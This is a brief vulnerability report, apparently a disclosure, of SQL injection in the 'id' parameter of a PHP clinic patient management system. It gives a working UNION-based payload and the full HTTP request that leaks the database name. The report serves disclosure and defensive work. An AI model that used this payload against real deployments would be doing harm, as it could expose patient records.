# Clinic's Patient Management System v1.0 by oretnom23 has SQL injection

BUG_Author：JinLongZhou

vendors: https://www.sourcecodester.com/php-clinics-patient-management-system-source-code

Vulnerability File: /pms/update_medicine.php?id=

Vulnerability location: /pms/update_medicine.php?id=, id

dbname = pms_db

[+] Payload: /pms/update_medicine.php?id=-2%20union%20select%201,database()--+ // Leak place ---> id

```SQL
GET /pms/update_medicine.php?id=-2%20union%20select%201,database()--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=odknb2obdq1nkaqk7p7u8hvli8
Connection: close
```

![IMG](https://user-images.githubusercontent.com/54017627/177024923-6f9f3a80-d822-4c43-bafd-996b63a13438.png)
